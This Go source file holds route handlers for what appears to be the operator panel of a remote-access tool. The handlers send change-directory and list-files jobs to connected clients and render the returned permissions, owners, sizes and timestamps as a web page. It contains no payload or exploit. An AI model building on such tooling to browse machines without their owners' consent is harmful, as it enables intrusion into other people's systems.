package routes

import (
	"bytes"
	"fmt"
	"net/http"
	"path"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

type entry struct {
	Name   string
	IsDir  bool
	Mode   int64
	UID    int64
	GID    int64
	Size   uint64
	MTime  int64
	CTime  int64
	Hidden bool
}

var perm_nums []int64 = []int64{
	0400, 0200, 0100, // user perms
	0400 >> 3, 0200 >> 3, 0100 >> 3, // group perms
	0400 >> 6, 0200 >> 6, 0100 >> 6, // other perms
}

func (e *entry) Perms() string {
	res := bytes.Repeat([]byte{'-'}, 9)

	for i, n := range perm_nums {
		if i%3 == 0 && e.Mode&n != 0 {
			res[i] = 'r'
		} else if (i+2)%3 == 0 && e.Mode&n != 0 {
			res[i] = 'w'
		} else if (i+1)%3 == 0 && e.Mode&n != 0 {
			res[i] = 'x'
		}
	}

	return string(res)
}

func (e *entry) humanTime(ut int64) string {
	t := time.Unix(ut, 0)
	return t.Format("15:04:05 02/01/2006")
}

func (e *entry) CreationTime() string {
	return e.humanTime(e.CTime)
}

func (e *entry) ModificationTime() string {
	return e.humanTime(e.MTime)
}

func (e *entry) HumanSize() string {
	return util.HumanizeSize(e.Size)
}

func newEntry(s string) (*entry, error) {
	var (
		sects []string
		ent   entry
		err   error
	)

	if !strings.Contains(s, "/") {
		return nil, fmt.Errorf("%s", s)
	}

	if sects = strings.Split(s, "/"); len(sects) < 9 {
		return nil, fmt.Errorf("entry doesn't contain enough sections")
	}

	ent.Name = sects[0]
	ent.IsDir = sects[1] == "1"

	if ent.Mode, err = strconv.ParseInt(sects[2], 10, 32); err != nil {
		return nil, fmt.Errorf("failed to parse the entry mode: %s", err.Error())
	}

	if ent.UID, err = strconv.ParseInt(sects[3], 10, 32); err != nil {
		return nil, fmt.Errorf("failed to parse the entry UID: %s", err.Error())
	}

	if ent.GID, err = strconv.ParseInt(sects[4], 10, 32); err != nil {
		return nil, fmt.Errorf("failed to parse the entry GID: %s", err.Error())
	}

	if ent.Size, err = strconv.ParseUint(sects[5], 10, 64); err != nil {
		return nil, fmt.Errorf("failed to parse the entry size: %s", err.Error())
	}

	if ent.MTime, err = strconv.ParseInt(sects[6], 10, 64); err != nil {
		return nil, fmt.Errorf("failed to parse the entry modification time: %s", err.Error())
	}

	if ent.CTime, err = strconv.ParseInt(sects[7], 10, 64); err != nil {
		return nil, fmt.Errorf("failed to parse the entry creation time: %s", err.Error())
	}

	ent.Hidden = sects[8] == "1"
	return &ent, nil
}

func filesChdir(c *fiber.Ctx, client *database.Client, jobs *joblist.Type, dirp string) (bool, error) {
	var (
		job     *joblist.Job
		res_str string
		err     error
	)

	data := util.NewBuffer(dirp)
	res := util.NewBuffer()

	if job, err = jobs.Add(client.ID, joblist.CMD_CHDIR, data, res); err != nil {
		log.Fail("failed to add the change directory job: %s", err.Error())
		return false, util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		log.Debg("change directory job timeouted for %s", client.ID)
		return false, util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
	}

	if res_str = res.String(); res_str != "success" {
		return false, util.RenderErr(c,
			fmt.Sprintf("change directory job failed: %s", res_str), http.StatusGatewayTimeout,
		)
	}

	return true, nil
}

func filesList(c *fiber.Ctx, client *database.Client, jobs *joblist.Type, dirp string) error {
	var (
		job *joblist.Job

		ent      *entry
		entries  []*entry
		ents_str []string
		res_str  string

		err error
	)

	data := util.NewBuffer("-")
	res := util.NewBuffer()

	if job, err = jobs.Add(client.ID, joblist.CMD_LIST, data, res); err != nil {
		log.Fail("failed to add file listing job: %s", err.Error())
		return util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		log.Debg("file listing job timed out for %s", client.ID)
		return util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
	}

	res_str = res.String()
	ents_str = strings.Split(res_str, "//")

	for _, s := range ents_str {
		if s == "" {
			continue
		}

		if ent, err = newEntry(s); err != nil {
			log.Debg("failed to load the entry from \"%s\": %s", s, err.Error())
			return util.RenderErr(c,
				fmt.Sprintf("file list job failed: %s", err.Error()), http.StatusGatewayTimeout,
			)
		}

		entries = append(entries, ent)
	}

	sort.Slice(entries, func(i, j int) bool {
		return entries[i].Name < entries[j].Name
	})

	return util.Render(c, "files", fiber.Map{
		"dir":     dirp,
		"join":    path.Join,
		"client":  client,
		"entries": entries,
	})
}

func GET_files(c *fiber.Ctx) error {
	var (
		client *database.Client
		jobs   *joblist.Type
		dirp   string
	)

	client = c.Locals("client").(*database.Client)
	jobs = c.Locals("joblist").(*joblist.Type)

	if dirp = c.Query("p"); dirp == "" {
		dirp = "/"
	}

	if ok, err := filesChdir(c, client, jobs, dirp); !ok {
		return err
	}

	return filesList(c, client, jobs, dirp)
}
